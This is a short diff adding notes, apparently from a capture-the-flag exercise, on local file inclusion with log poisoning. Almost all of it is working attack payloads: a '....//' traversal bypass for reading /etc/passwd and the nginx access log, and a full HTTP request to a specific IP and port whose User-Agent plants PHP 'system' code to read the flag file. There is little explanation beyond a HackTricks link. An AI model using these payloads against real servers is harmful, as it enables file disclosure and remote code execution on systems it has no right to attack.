@@ -1,0 +1,16 @@
+bypass use: ....//....//....//....//etc/passwd
+
+Lien quan den Log Poisoning
+payload: ....//....//....//....///var/log/nginx/access.log
+
+
+GET /?file=....//....//....//....//%2fvar%2flog%2fnginx%2faccess%2elog HTTP/1.1
+Host: 13.212.226.251:31806
+User-Agent: <?php system('cat /flag*'); ?>
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://13.212.226.251:31806/
+Upgrade-Insecure-Requests: 1
+
+Resource: https://book.hacktricks.xyz/pentesting-web/file-inclusion
